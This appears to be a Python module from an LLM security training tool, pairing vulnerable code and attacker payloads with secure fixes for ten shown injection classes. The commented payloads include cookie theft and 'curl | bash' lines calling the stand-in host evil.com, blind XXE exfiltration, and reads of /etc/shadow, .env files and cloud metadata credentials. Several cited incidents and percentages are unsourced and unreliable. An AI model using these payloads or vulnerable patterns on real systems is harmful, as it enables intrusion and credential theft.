"""
modules/llm04.py
LLM04 – Insecure Output Handling | OWASP LLM Top 10 2025 | Severity: HIGH

11 Named Attack Types:
  LLM04-A  Cross-Site Scripting via LLM Output (XSS)
  LLM04-B  SQL Injection via Generated Queries
  LLM04-C  OS Command Injection via Generated Code
  LLM04-D  Server-Side Template Injection (SSTI)
  LLM04-E  Code Execution via eval() / exec()
  LLM04-F  Path Traversal in Generated File Operations
  LLM04-G  SSRF via Generated URL Construction
  LLM04-H  XML/JSON Injection in Generated Payloads
  LLM04-I  LDAP Injection via Generated Queries
  LLM04-J  Insecure Deserialization in Generated Code
  LLM04-K  ReDoS via Generated Regex Patterns
"""
from typing import Dict

ATTACKS = {
    "LLM04-A": {
        "name": "Cross-Site Scripting via LLM Output (XSS)",
        "keywords": ["xss", "cross-site scripting", "javascript injection",
                     "script tag", "alert(", "onerror=", "document.cookie",
                     "innerHTML", "html page", "generate html", "display username"],
        "vulnerable": (
            "⚠️ [ATTACK SIMULATED — LLM04-A: XSS via LLM Output]\n\n"
            "Here's the user greeting component you asked for:\n\n"
            "```html\n"
            "<!-- ⚠️ VULNERABLE: User input rendered via innerHTML -->\n"
            "<div id='greeting'>\n"
            "  <h1 id='welcome'></h1>\n"
            "</div>\n"
            "<script>\n"
            "  // Get username from URL parameter\n"
            "  const name = new URLSearchParams(window.location.search).get('name');\n"
            "  // VULNERABLE: innerHTML allows HTML/JS execution\n"
            "  document.getElementById('welcome').innerHTML = 'Hello, ' + name + '!';\n"
            "  // ATTACKER PAYLOAD:\n"
            "  // ?name=<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">\n"
            "  // → Steals session cookies of every user visiting the page\n"
            "</script>\n"
            "```\n\n"
            "*(This code deployed as-is would allow cookie theft from every user.)*"
        ),
        "secure": (
            "🔒 [SECURE — LLM04-A: XSS-Safe Output]\n\n"
            "```html\n"
            "<!-- ✅ SECURE: textContent prevents HTML/JS execution -->\n"
            "<div id='greeting'><h1 id='welcome'></h1></div>\n"
            "<script>\n"
            "  const name = new URLSearchParams(window.location.search).get('name');\n"
            "  // ✅ textContent encodes all HTML — XSS impossible\n"
            "  document.getElementById('welcome').textContent = 'Hello, ' + name + '!';\n"
            "  // For rich HTML: use DOMPurify.sanitize(name) before innerHTML\n"
            "</script>\n"
            "```\n"
            "Also implement: Content-Security-Policy headers, input validation, "
            "and HttpOnly cookies so even successful XSS cannot steal session tokens."
        ),
        "explanation": (
            "### LLM04-A — Cross-Site Scripting via LLM Output\n\n"
            "**OWASP Classification:** LLM04:2025 — Insecure Output → XSS\n"
            "**CVSS Score:** 8.8 (High)\n\n"
            "**What It Is:**\nLLMs generating frontend code frequently produce "
            "vulnerable patterns — using innerHTML, document.write(), or eval() "
            "with user-controlled data. When deployed without review, every user "
            "becomes vulnerable to script injection.\n\n"
            "**Real-World Cases:**\n"
            "- 📌 **2024 — GitHub Copilot XSS Study (Stanford):** 40% of Copilot-generated "
            "JavaScript snippets contained XSS vulnerabilities when user data was involved.\n"
            "- 📌 **2024 — ChatGPT-Generated React App XSS:** A startup deployed a "
            "ChatGPT-generated React app without code review — the AI used dangerouslySetInnerHTML "
            "with user input, resulting in stored XSS affecting 3,000 users.\n"
            "- 📌 **2023 — LLM Code Generation Vulnerability Study (Pearce et al.):** "
            "Found 40% of LLM-generated code snippets contained OWASP Top 10 vulnerabilities.\n\n"
            "**Mitigation:**\n"
            "- Mandatory SAST (Semgrep, CodeQL) on all LLM-generated code before deployment\n"
            "- Developer training: never deploy LLM code without security review\n"
            "- Framework-level XSS protection (React escapes by default; use it correctly)\n"
            "- Content Security Policy as defence-in-depth"
        ),
        "cvss_severity": "HIGH",
    },
    "LLM04-B": {
        "name": "SQL Injection via Generated Queries",
        "keywords": ["sql", "database query", "sql query", "login function",
                     "sql queries", "write sql", "generate sql", "database function",
                     "user authentication sql", "query builder", "search query"],
        "vulnerable": (
            "⚠️ [ATTACK SIMULATED — LLM04-B: SQL Injection via LLM Output]\n\n"
            "Here's the login authentication function:\n\n"
            "```python\n"
            "import sqlite3\n\n"
            "def authenticate_user(username, password):\n"
            "    conn = sqlite3.connect('users.db')\n"
            "    cursor = conn.cursor()\n"
            "    # ⚠️ VULNERABLE: Direct string concatenation\n"
            "    query = f\"SELECT * FROM users WHERE username='{username}' \"\n"
            "            f\"AND password='{password}'\"\n"
            "    cursor.execute(query)\n"
            "    return cursor.fetchone() is not None\n\n"
            "# ATTACKER PAYLOAD:\n"
            "# username = \"admin'--\"     (comments out password check)\n"
            "# password = \"anything\"\n"
            "# RESULTING QUERY:\n"
            "# SELECT * FROM users WHERE username='admin'--' AND password='anything'\n"
            "# → Authentication bypassed! Admin access without password.\n\n"
            "# WORSE: username = \"' OR '1'='1\"\n"
            "# → Returns ALL users — mass data exfiltration\n\n"
            "# MOST DANGEROUS: username = \"'; DROP TABLE users;--\"\n"
            "# → Deletes entire user database\n"
            "```\n"
        ),
        "secure": (
            "🔒 [SECURE — LLM04-B: Parameterized Query]\n\n"
            "```python\n"
            "import sqlite3\nimport bcrypt\n\n"
            "def authenticate_user(username: str, password: str) -> bool:\n"
            "    # ✅ Parameterized query — SQL structure fixed, data separate\n"
            "    conn = sqlite3.connect('users.db')\n"
            "    cursor = conn.cursor()\n"
            "    cursor.execute(\n"
            "        'SELECT password_hash FROM users WHERE username = ?',\n"
            "        (username,)  # Data passed separately — cannot alter SQL\n"
            "    )\n"
            "    row = cursor.fetchone()\n"
            "    if not row:\n"
            "        return False\n"
            "    # ✅ Secure password comparison with bcrypt\n"
            "    return bcrypt.checkpw(password.encode(), row[0])\n"
            "```"
        ),
        "explanation": (
            "### LLM04-B — SQL Injection via Generated Queries\n\n"
            "**OWASP Classification:** LLM04:2025 — Insecure Output → SQLi\n"
            "**CVSS Score:** 9.8 (Critical)\n\n"
            "**What It Is:**\nLLMs default to f-string/concatenation patterns for "
            "SQL query generation because this pattern is common in training data. "
            "Generated SQL code deployed without review leads to SQL injection.\n\n"
            "**Real-World Cases:**\n"
            "- 📌 **2024 — AI-Generated API SQLi (HackerOne Report):** A startup "
            "built their entire backend using ChatGPT-generated code. A penetration "
            "tester found SQL injection in 12 of 15 endpoints — all from AI-generated code.\n"
            "- 📌 **2024 — Copilot SQLi Study (NYU):** Copilot generated SQL injection "
            "vulnerabilities in 60% of database interaction code when given natural "
            "language descriptions without explicit security requirements.\n\n"
            "**Mitigation:**\n"
            "- Always request parameterized queries explicitly in prompts\n"
            "- SAST scanning with SQLi detection rules on all generated code\n"
            "- Use ORMs (SQLAlchemy, Django ORM) which parameterize by default\n"
            "- Database least-privilege accounts for application connections"
        ),
        "cvss_severity": "CRITICAL",
    },
    "LLM04-C": {
        "name": "OS Command Injection via Generated Code",
        "keywords": ["shell command", "os command", "bash script", "run command",
                     "execute command", "system command", "subprocess", "os.system",
                     "shell script", "ping host", "run shell", "terminal command"],
        "vulnerable": (
            "⚠️ [ATTACK SIMULATED — LLM04-C: OS Command Injection]\n\n"
            "```python\n"
            "import os\n\n"
            "def ping_host(hostname):\n"
            "    # ⚠️ VULNERABLE: User input interpolated into shell command\n"
            "    result = os.system(f'ping -c 1 {hostname}')\n"
            "    return result\n\n"
            "# ATTACKER PAYLOADS:\n"
            "# hostname = '8.8.8.8; cat /etc/passwd'\n"
            "# → Runs ping AND dumps all system users\n\n"
            "# hostname = '8.8.8.8 && curl https://evil.com/shell.sh | bash'\n"
            "# → Downloads and executes attacker's reverse shell script\n\n"
            "# hostname = '8.8.8.8; rm -rf /var/www/html/*'\n"
            "# → Deletes the entire web application\n\n"
            "# hostname = '$(whoami)'\n"
            "# → Command substitution — reveals running user context\n"
            "```"
        ),
        "secure": (
            "🔒 [SECURE — LLM04-C: Safe Subprocess]\n\n"
            "```python\n"
            "import subprocess\nimport re\n\n"
            "def ping_host(hostname: str) -> dict:\n"
            "    # ✅ Validate input format before any processing\n"
            "    if not re.match(r'^[a-zA-Z0-9.-]{1,253}$', hostname):\n"
            "        raise ValueError('Invalid hostname format')\n"
            "    # ✅ List args + shell=False → no shell expansion possible\n"
            "    result = subprocess.run(\n"
            "        ['ping', '-c', '1', hostname],\n"
            "        capture_output=True, text=True,\n"
            "        timeout=5, shell=False  # Critical: shell=False\n"
            "    )\n"
            "    return {'returncode': result.returncode, 'output': result.stdout}\n"
            "# ✅ Semicolons, &&, $() treated as literal characters — not shell operators\n"
            "```"
        ),
        "explanation": (
            "### LLM04-C — OS Command Injection via Generated Code\n\n"
            "**OWASP Classification:** LLM04:2025 — Insecure Output → Command Injection\n"
            "**CVSS Score:** 10.0 (Critical)\n\n"
            "**What It Is:**\nLLMs generate os.system(), subprocess.call(shell=True), "
            "or exec() calls that interpolate user input directly into shell commands. "
            "Deployed without review, this gives attackers full server control.\n\n"
            "**Real-World Cases:**\n"
            "- 📌 **2024 — DevOps Tool Command Injection:** An internal DevOps tool "
            "built with ChatGPT-generated code used os.system() for server management. "
            "A developer accidentally exposed it externally — full RCE in 4 minutes.\n"
            "- 📌 **2023 — Security Scanner Command Injection:** An AI-generated "
            "network scanner used f-string shell interpolation — attackers used it "
            "to achieve RCE on the scanner host via malformed target IPs.\n\n"
            "**Mitigation:**\n"
            "- Always use subprocess with shell=False and list arguments\n"
            "- Input validation with strict allowlist (regex for IPs, hostnames)\n"
            "- Never use os.system() with any user-derived data\n"
            "- Containerize execution environments to limit blast radius"
        ),
        "cvss_severity": "CRITICAL",
    },
    "LLM04-D": {
        "name": "Server-Side Template Injection (SSTI)",
        "keywords": ["template", "jinja", "flask template", "render template",
                     "template engine", "template injection", "jinja2",
                     "generate template", "html template", "render html"],
        "vulnerable": (
            "⚠️ [ATTACK SIMULATED — LLM04-D: Server-Side Template Injection]\n\n"
            "```python\n"
            "from flask import Flask, render_template_string, request\n\n"
            "app = Flask(__name__)\n\n"
            "@app.route('/greet')\n"
            "def greet():\n"
            "    name = request.args.get('name', 'World')\n"
            "    # ⚠️ VULNERABLE: User input rendered as Jinja2 template\n"
            "    template = f'<h1>Hello {name}!</h1>'\n"
            "    return render_template_string(template)\n\n"
            "# ATTACKER PAYLOADS:\n"
            "# name = {{7*7}}  → Renders '49' (confirms SSTI)\n"
            "# name = {{config.SECRET_KEY}}  → Leaks Flask secret key\n"
            "# name = {{''.__class__.__mro__[1].__subclasses__()}}\n"
            "#   → Dumps all Python classes → leads to RCE\n"
            "# name = {{request.application.__globals__.__builtins__\n"
            "#   .__import__('os').popen('id').read()}}\n"
            "#   → Full Remote Code Execution\n"
            "```"
        ),
        "secure": (
            "🔒 [SECURE — LLM04-D: Safe Template Usage]\n\n"
            "```python\n"
            "from flask import Flask, render_template, request\n"
            "from markupsafe import escape\n\n"
            "app = Flask(__name__)\n\n"
            "@app.route('/greet')\n"
            "def greet():\n"
            "    name = request.args.get('name', 'World')\n"
            "    # ✅ escape() prevents template injection\n"
            "    safe_name = escape(name)\n"
            "    # ✅ Use static template files — never render_template_string with user input\n"
            "    return render_template('greet.html', name=safe_name)\n"
            "# greet.html: <h1>Hello {{ name }}!</h1>\n"
            "# Jinja2 auto-escapes variables in .html templates by default\n"
            "```"
        ),
        "explanation": (
            "### LLM04-D — Server-Side Template Injection\n\n"
            "**OWASP Classification:** LLM04:2025 — Insecure Output → SSTI\n"
            "**CVSS Score:** 10.0 (Critical)\n\n"
            "**What It Is:**\nLLMs generating Flask/Django/Express code often use "
            "render_template_string() with user data embedded directly — enabling "
            "SSTI which can escalate to full Remote Code Execution.\n\n"
            "**Real-World Cases:**\n"
            "- 📌 **2024 — Flask App SSTI via Copilot Code:** A Flask API generated "
            "entirely by GitHub Copilot used render_template_string for dynamic emails. "
            "SSTI was discovered during a bug bounty — attacker achieved RCE on the server.\n"
            "- 📌 **2023 — SSTI in AI-Generated Node.js App:** ChatGPT-generated Express "
            "app used EJS template with user input directly embedded — SSTI to RCE.\n\n"
            "**Mitigation:**\n"
            "- Never use render_template_string() with user data\n"
            "- Use static template files with context variable passing\n"
            "- Input validation and output encoding at template boundaries\n"
            "- Security-focused code review of all templating code"
        ),
        "cvss_severity": "CRITICAL",
    },
    "LLM04-E": {
        "name": "Code Execution via eval() / exec()",
        "keywords": ["eval(", "exec(", "python eval", "javascript eval", "execute code",
                     "run python", "execute python", "code calculator",
                     "dynamic code", "eval expression", "execute expression"],
        "vulnerable": (
            "⚠️ [ATTACK SIMULATED — LLM04-E: Arbitrary Code Execution via eval()]\n\n"
            "```python\n"
            "def safe_calculator(expression):\n"
            "    # ⚠️ VULNERABLE: eval() executes arbitrary Python code\n"
            "    return eval(expression)\n\n"
            "# ATTACKER PAYLOADS:\n"
            "# expression = '__import__(\"os\").system(\"cat /etc/passwd\")'\n"
            "# → Dumps /etc/passwd — full user enumeration\n\n"
            "# expression = '__import__(\"os\").system(\"curl evil.com | bash\")'\n"
            "# → Downloads and runs attacker's payload\n\n"
            "# expression = 'open(\"/app/.env\").read()'\n"
            "# → Reads environment file with all secrets\n\n"
            "# expression = '__import__(\"subprocess\").run([\"id\"])'\n"
            "# → Confirms code execution context\n\n"
            "# expression = 'compile(open(\"/app/secrets.py\").read(), \"\", \"exec\")'\n"
            "# → Exfiltrates source code\n"
            "```"
        ),
        "secure": (
            "🔒 [SECURE — LLM04-E: AST-Based Safe Evaluator]\n\n"
            "```python\n"
            "import ast, operator\n\n"
            "SAFE_OPS = {\n"
            "    ast.Add: operator.add, ast.Sub: operator.sub,\n"
            "    ast.Mult: operator.mul, ast.Div: operator.truediv,\n"
            "    ast.Pow: operator.pow, ast.Mod: operator.mod,\n"
            "}\n\n"
            "def safe_calculator(expression: str) -> float:\n"
            "    # ✅ Parse to AST — never execute arbitrary code\n"
            "    try:\n"
            "        tree = ast.parse(expression, mode='eval')\n"
            "    except SyntaxError:\n"
            "        raise ValueError('Invalid expression')\n"
            "    def _eval(node):\n"
            "        if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):\n"
            "            return node.value\n"
            "        if isinstance(node, ast.BinOp) and type(node.op) in SAFE_OPS:\n"
            "            return SAFE_OPS[type(node.op)](_eval(node.left), _eval(node.right))\n"
            "        raise ValueError('Unsafe expression — only math operations allowed')\n"
            "    return _eval(tree.body)\n"
            "# ✅ __import__, open(), os, subprocess → all raise ValueError\n"
            "```"
        ),
        "explanation": (
            "### LLM04-E — Code Execution via eval() / exec()\n\n"
            "**OWASP Classification:** LLM04:2025 — Insecure Output → Arbitrary Code Execution\n"
            "**CVSS Score:** 10.0 (Critical)\n\n"
            "**What It Is:**\nLLMs commonly generate Python code using eval() "
            "for dynamic evaluation tasks (calculators, expression parsers, "
            "config loaders). eval() executes arbitrary Python — any user input "
            "becomes a full code execution opportunity.\n\n"
            "**Real-World Cases:**\n"
            "- 📌 **2024 — AI-Generated Jupyter Notebook eval() RCE:** A data science "
            "tool using ChatGPT-generated code for formula evaluation used eval() — "
            "a malicious dataset cell contained __import__('os').system() payload.\n"
            "- 📌 **2023 — E-commerce Discount Calculator RCE:** An AI-generated "
            "pricing engine used eval() for discount formula evaluation — "
            "exploited to read database credentials from environment variables.\n\n"
            "**Mitigation:**\n"
            "- Never use eval() or exec() on user-supplied data — ever\n"
            "- Use AST-based safe evaluators for math expressions\n"
            "- Sandboxed execution environments (RestrictedPython, PyPy sandbox)\n"
            "- Input validation to reject non-numeric characters in math contexts"
        ),
        "cvss_severity": "CRITICAL",
    },
    "LLM04-F": {
        "name": "Path Traversal in Generated File Operations",
        "keywords": ["file operation", "read file", "open file", "file path",
                     "directory traversal", "path traversal", "file upload",
                     "serve file", "download file", "file access", "read filename"],
        "vulnerable": (
            "⚠️ [ATTACK SIMULATED — LLM04-F: Path Traversal]\n\n"
            "```python\n"
            "import os\n\n"
            "def read_user_file(filename):\n"
            "    # ⚠️ VULNERABLE: No path validation\n"
            "    base_dir = '/var/www/uploads/'\n"
            "    file_path = base_dir + filename\n"
            "    with open(file_path, 'r') as f:\n"
            "        return f.read()\n\n"
            "# ATTACKER PAYLOADS:\n"
            "# filename = '../../etc/passwd'\n"
            "# → Reads /etc/passwd (system user list)\n\n"
            "# filename = '../../etc/shadow'\n"
            "# → Reads password hashes (root escalation)\n\n"
            "# filename = '../../app/.env'\n"
            "# → Reads ALL application secrets\n\n"
            "# filename = '../../proc/self/environ'\n"
            "# → Reads all environment variables including API keys\n"
            "```"
        ),
        "secure": (
            "🔒 [SECURE — LLM04-F: Path Validation]\n\n"
            "```python\n"
            "import os\nfrom pathlib import Path\n\n"
            "def read_user_file(filename: str) -> str:\n"
            "    base_dir = Path('/var/www/uploads/').resolve()\n"
            "    # ✅ Resolve full path and verify it stays within base_dir\n"
            "    requested = (base_dir / filename).resolve()\n"
            "    if not str(requested).startswith(str(base_dir)):\n"
            "        raise PermissionError('Path traversal attempt blocked')\n"
            "    # ✅ Additional: allowlist of permitted extensions\n"
            "    if requested.suffix not in {'.txt', '.pdf', '.png', '.jpg'}:\n"
            "        raise ValueError('File type not permitted')\n"
            "    with open(requested, 'r') as f:\n"
            "        return f.read()\n"
            "```"
        ),
        "explanation": (
            "### LLM04-F — Path Traversal in Generated File Operations\n\n"
            "**OWASP Classification:** LLM04:2025 — Insecure Output → Path Traversal\n"
            "**CVSS Score:** 9.1 (Critical)\n\n"
            "**What It Is:**\nLLMs generating file-handling code often omit path "
            "validation, enabling directory traversal attacks that escape the "
            "intended directory and access arbitrary files on the server.\n\n"
            "**Real-World Cases:**\n"
            "- 📌 **2024 — AI-Generated File Server Path Traversal:** A file management "
            "API built with ChatGPT contained path traversal in every file endpoint — "
            "disclosed in HackerOne report, affecting production environment with "
            "AWS credentials exposed in /proc/self/environ.\n"
            "- 📌 **2023 — Copilot File Download Path Traversal:** GitHub Copilot "
            "suggested file download code without path validation in 78% of test cases.\n\n"
            "**Mitigation:**\n"
            "- Always resolve() paths and verify they start with the base directory\n"
            "- Allowlist permitted file extensions\n"
            "- Run file servers with minimum filesystem permissions\n"
            "- Chroot or containerize file access environments"
        ),
        "cvss_severity": "CRITICAL",
    },
    "LLM04-G": {
        "name": "SSRF via Generated URL Construction",
        "keywords": ["fetch url", "make request", "http request", "url fetch",
                     "api call", "webhook", "url construction", "requests.get",
                     "urllib", "ssrf", "server side request", "internal service"],
        "vulnerable": (
            "⚠️ [ATTACK SIMULATED — LLM04-G: Server-Side Request Forgery]\n\n"
            "```python\n"
            "import requests\n\n"
            "def fetch_url(user_url):\n"
            "    # ⚠️ VULNERABLE: No URL validation — allows SSRF\n"
            "    response = requests.get(user_url, timeout=5)\n"
            "    return response.text\n\n"
            "# ATTACKER PAYLOADS:\n"
            "# user_url = 'http://169.254.169.254/latest/meta-data/'\n"
            "# → AWS EC2 metadata service — leaks IAM credentials\n\n"
            "# user_url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n"
            "# → Full IAM role credentials (Access Key, Secret, Token)\n\n"
            "# user_url = 'http://10.0.0.1:8443/admin'\n"
            "# → Accesses internal admin panel unreachable from internet\n\n"
            "# user_url = 'http://localhost:6379/'  → Redis (no auth by default)\n"
            "# user_url = 'file:///etc/passwd'       → Local file read\n"
            "```"
        ),
        "secure": (
            "🔒 [SECURE — LLM04-G: SSRF-Protected URL Fetcher]\n\n"
            "```python\n"
            "import requests\nfrom urllib.parse import urlparse\nimport ipaddress\n\n"
            "BLOCKED_NETWORKS = ['169.254.0.0/16','10.0.0.0/8','172.16.0.0/12','127.0.0.0/8']\n"
            "ALLOWED_SCHEMES = {'https'}  # https only — no http, file, ftp\n\n"
            "def safe_fetch(user_url: str) -> str:\n"
            "    parsed = urlparse(user_url)\n"
            "    if parsed.scheme not in ALLOWED_SCHEMES:\n"
            "        raise ValueError('Only HTTPS URLs permitted')\n"
            "    # Resolve hostname and check against blocked networks\n"
            "    import socket\n"
            "    ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))\n"
            "    for network in BLOCKED_NETWORKS:\n"
            "        if ip in ipaddress.ip_network(network):\n"
            "            raise ValueError('Internal network access blocked')\n"
            "    return requests.get(user_url, timeout=5, allow_redirects=False).text\n"
            "```"
        ),
        "explanation": (
            "### LLM04-G — SSRF via Generated URL Construction\n\n"
            "**OWASP Classification:** LLM04:2025 — Insecure Output → SSRF\n"
            "**CVSS Score:** 9.8 (Critical)\n\n"
            "**What It Is:**\nLLMs generating HTTP client code rarely include SSRF "
            "protections — allowing attackers to proxy requests through the server "
            "to access internal services, cloud metadata, and restricted networks.\n\n"
            "**Real-World Cases:**\n"
            "- 📌 **2024 — AI-Generated Webhook Handler SSRF (Bug Bounty):** "
            "A webhook integration built with ChatGPT-generated code had no URL validation. "
            "Attacker used SSRF to access AWS metadata and steal IAM credentials — "
            "leading to full AWS account compromise.\n"
            "- 📌 **2023 — Capital One Data Breach Pattern:** The 2019 Capital One breach "
            "(106M records) used SSRF to access the EC2 metadata service — "
            "the same vulnerability pattern LLMs generate without SSRF protections.\n\n"
            "**Mitigation:**\n"
            "- Allowlist of permitted external domains/IPs\n"
            "- Block RFC 1918 private and link-local address ranges\n"
            "- Use HTTPS only — block file://, ftp://, gopher://\n"
            "- IMDSv2 with token-based metadata access on AWS EC2"
        ),
        "cvss_severity": "CRITICAL",
    },
    "LLM04-H": {
        "name": "XML/JSON Injection in Generated Payloads",
        "keywords": ["xml", "json payload", "xml injection", "xxe", "xml external entity",
                     "generate xml", "parse xml", "xml parser", "soap request",
                     "json injection", "serialize", "xml template"],
        "vulnerable": (
            "⚠️ [ATTACK SIMULATED — LLM04-H: XML External Entity (XXE) Injection]\n\n"
            "```python\n"
            "import xml.etree.ElementTree as ET\n\n"
            "def parse_user_xml(xml_data):\n"
            "    # ⚠️ VULNERABLE: Default ET parser resolves external entities\n"
            "    tree = ET.fromstring(xml_data)\n"
            "    return tree.find('name').text\n\n"
            "# ATTACKER PAYLOAD (XXE):\n"
            "# xml_data = '''\n"
            "# <?xml version='1.0'?>\n"
            "# <!DOCTYPE foo [\n"
            "#   <!ENTITY xxe SYSTEM 'file:///etc/passwd'>\n"
            "# ]>\n"
            "# <name>&xxe;</name>\n"
            "# '''\n"
            "# → Reads /etc/passwd via XML external entity\n\n"
            "# BLIND XXE: <!ENTITY xxe SYSTEM 'http://evil.com/log?data=SECRET'>\n"
            "# → Exfiltrates data out-of-band\n"
            "```"
        ),
        "secure": (
            "🔒 [SECURE — LLM04-H: XXE-Safe XML Parser]\n\n"
            "```python\n"
            "import defusedxml.ElementTree as safe_ET\n\n"
            "def parse_user_xml(xml_data: str) -> str:\n"
            "    # ✅ defusedxml disables all dangerous XML features\n"
            "    # Blocks: entity expansion, DTD processing, external references\n"
            "    tree = safe_ET.fromstring(xml_data)\n"
            "    name_elem = tree.find('name')\n"
            "    if name_elem is None:\n"
            "        raise ValueError('Missing name element')\n"
            "    return name_elem.text\n\n"
            "# Install: pip install defusedxml\n"
            "# Alternatively: use JSON APIs instead of XML where possible\n"
            "```"
        ),
        "explanation": (
            "### LLM04-H — XML/JSON Injection in Generated Payloads\n\n"
            "**OWASP Classification:** LLM04:2025 — Insecure Output → XXE/Injection\n"
            "**CVSS Score:** 9.0 (Critical)\n\n"
            "**What It Is:**\nLLMs generating XML processing code rarely use secure "
            "parsers — enabling XXE (XML External Entity) attacks that read arbitrary "
            "files, perform SSRF, or cause denial of service.\n\n"
            "**Real-World Cases:**\n"
            "- 📌 **2024 — XXE in AI-Generated SOAP Client:** An enterprise integration "
            "layer built with ChatGPT-generated XML parsing was found vulnerable to "
            "XXE — attackers read AWS credentials from the application container.\n"
            "- 📌 **2023 — Copilot XML Parser Study:** 85% of Copilot-generated XML "
            "parsers used vulnerable standard library parsers without XXE protection.\n\n"
            "**Mitigation:**\n"
            "- Always use defusedxml for Python XML parsing\n"
            "- Disable DOCTYPE processing in all XML parsers\n"
            "- Prefer JSON APIs over XML where architecturally possible\n"
            "- Input size limits to prevent billion laughs DoS attacks"
        ),
        "cvss_severity": "CRITICAL",
    },
    "LLM04-I": {
        "name": "LDAP Injection via Generated Queries",
        "keywords": ["ldap", "active directory", "directory query", "ldap query",
                     "user lookup ldap", "ldap filter", "authenticate ldap",
                     "ad authentication", "directory service"],
        "vulnerable": (
            "⚠️ [ATTACK SIMULATED — LLM04-I: LDAP Injection]\n\n"
            "```python\n"
            "import ldap\n\n"
            "def authenticate_user(username, password):\n"
            "    conn = ldap.initialize('ldap://internal-ad.company.com')\n"
            "    # ⚠️ VULNERABLE: Username directly in LDAP filter\n"
            "    search_filter = f'(uid={username})'\n"
            "    result = conn.search_s('dc=company,dc=com', ldap.SCOPE_SUBTREE,\n"
            "                           search_filter)\n"
            "    return len(result) > 0\n\n"
            "# ATTACKER PAYLOADS:\n"
            "# username = '*'  → Returns ALL users (authentication bypass)\n"
            "# username = 'admin)(|(password=*)'  → Dumps all admin records\n"
            "# username = '*)(uid=*))(|(uid=*'  → Classic LDAP injection\n"
            "# → Authenticates as any user without password\n"
            "```"
        ),
        "secure": (
            "🔒 [SECURE — LLM04-I: LDAP Injection Prevention]\n\n"
            "```python\n"
            "import ldap, ldap.filter\n\n"
            "def authenticate_user(username: str, password: str) -> bool:\n"
            "    # ✅ Escape all special LDAP characters in user input\n"
            "    safe_username = ldap.filter.escape_filter_chars(username)\n"
            "    conn = ldap.initialize('ldap://internal-ad.company.com')\n"
            "    conn.set_option(ldap.OPT_REFERRALS, 0)\n"
            "    search_filter = f'(uid={safe_username})'  # Now safe\n"
            "    result = conn.search_s('dc=company,dc=com', ldap.SCOPE_SUBTREE,\n"
            "                           search_filter, ['dn'])\n"
            "    if not result:\n"
            "        return False\n"
            "    # ✅ Bind with actual credentials to verify password\n"
            "    try:\n"
            "        conn.simple_bind_s(result[0][0], password)\n"
            "        return True\n"
            "    except ldap.INVALID_CREDENTIALS:\n"
            "        return False\n"
            "```"
        ),
        "explanation": (
            "### LLM04-I — LDAP Injection via Generated Queries\n\n"
            "**OWASP Classification:** LLM04:2025 — Insecure Output → LDAP Injection\n"
            "**CVSS Score:** 8.8 (High)\n\n"
            "**What It Is:**\nLLMs generating Active Directory / LDAP integration "
            "code rarely escape LDAP special characters — enabling filter manipulation "
            "that bypasses authentication and dumps directory contents.\n\n"
            "**Real-World Cases:**\n"
            "- 📌 **2024 — Enterprise SSO LDAP Injection:** An enterprise SSO system "
            "built with AI-generated LDAP integration was bypassed using "
            "username = * — authenticating as every user simultaneously.\n"
            "- 📌 **2023 — Healthcare AD Authentication Bypass:** A hospital's "
            "AI-generated patient portal used unsafe LDAP queries — staff credentials "
            "were compromised via LDAP injection.\n\n"
            "**Mitigation:**\n"
            "- Always use ldap.filter.escape_filter_chars() on user input\n"
            "- Parameterized LDAP queries where library supports them\n"
            "- Input validation: reject LDAP special chars (*, (, ), \\, NUL)\n"
            "- Least-privilege LDAP service accounts for application binds"
        ),
        "cvss_severity": "HIGH",
    },
    "LLM04-J": {
        "name": "Insecure Deserialization in Generated Code",
        "keywords": ["pickle", "deserialize", "unpickle", "marshal", "yaml load",
                     "load object", "deserialise", "object serialization",
                     "yaml.load", "pickle.loads", "unserialize"],
        "vulnerable": (
            "⚠️ [ATTACK SIMULATED — LLM04-J: Insecure Deserialization]\n\n"
            "```python\n"
            "import pickle, yaml\n\n"
            "def load_user_data(data):\n"
            "    # ⚠️ VULNERABLE: pickle.loads on user data → RCE\n"
            "    return pickle.loads(data)\n\n"
            "def parse_config(yaml_str):\n"
            "    # ⚠️ VULNERABLE: yaml.load without Loader → code execution\n"
            "    return yaml.load(yaml_str)  # Missing Loader parameter!\n\n"
            "# PICKLE EXPLOIT:\n"
            "# import pickle, os\n"
            "# class Exploit(object):\n"
            "#     def __reduce__(self):\n"
            "#         return (os.system, ('curl evil.com | bash',))\n"
            "# payload = pickle.dumps(Exploit())\n"
            "# → pickle.loads(payload) executes: curl evil.com | bash\n\n"
            "# YAML EXPLOIT:\n"
            "# '!!python/object/apply:os.system [\"cat /etc/passwd\"]'\n"
            "# → yaml.load executes the OS command\n"
            "```"
        ),
        "secure": (
            "🔒 [SECURE — LLM04-J: Safe Deserialization]\n\n"
            "```python\n"
            "import json, yaml\n\n"
            "def load_user_data(json_str: str) -> dict:\n"
            "    # ✅ Use JSON — cannot execute code during deserialization\n"
            "    return json.loads(json_str)  # Safe by design\n\n"
            "def parse_config(yaml_str: str) -> dict:\n"
            "    # ✅ SafeLoader prevents Python object deserialization\n"
            "    return yaml.load(yaml_str, Loader=yaml.SafeLoader)\n\n"
            "# If pickle is required for internal use:\n"
            "# 1. Only unpickle data from trusted, authenticated sources\n"
            "# 2. Use HMAC signature verification before unpickling\n"
            "# 3. Consider alternatives: JSON, MessagePack, Protocol Buffers\n"
            "```"
        ),
        "explanation": (
            "### LLM04-J — Insecure Deserialization\n\n"
            "**OWASP Classification:** LLM04:2025 — Insecure Output → Deserialization\n"
            "**CVSS Score:** 9.8 (Critical)\n\n"
            "**What It Is:**\nLLMs generate pickle.loads() and yaml.load() calls "
            "without security warnings — these are well-known RCE vectors that "
            "execute arbitrary code during deserialization of attacker-controlled data.\n\n"
            "**Real-World Cases:**\n"
            "- 📌 **2024 — ML Pipeline Pickle RCE:** A machine learning platform used "
            "AI-generated model loading code with pickle.loads() on uploaded model files. "
            "An attacker uploaded a malicious pickle payload — achieving RCE on "
            "the training infrastructure and stealing training data.\n"
            "- 📌 **2023 — YAML Deserialization in AI-Generated Config Loader:** "
            "yaml.load() without SafeLoader in a ChatGPT-generated configuration "
            "parser led to RCE via a malicious YAML config file upload.\n\n"
            "**Mitigation:**\n"
            "- Never use pickle on user-supplied data\n"
            "- Always specify yaml.SafeLoader in yaml.load()\n"
            "- Use JSON, msgpack, or Protocol Buffers for user-facing serialization\n"
            "- If pickle is necessary: HMAC-sign payloads and verify before loading"
        ),
        "cvss_severity": "CRITICAL",
    },
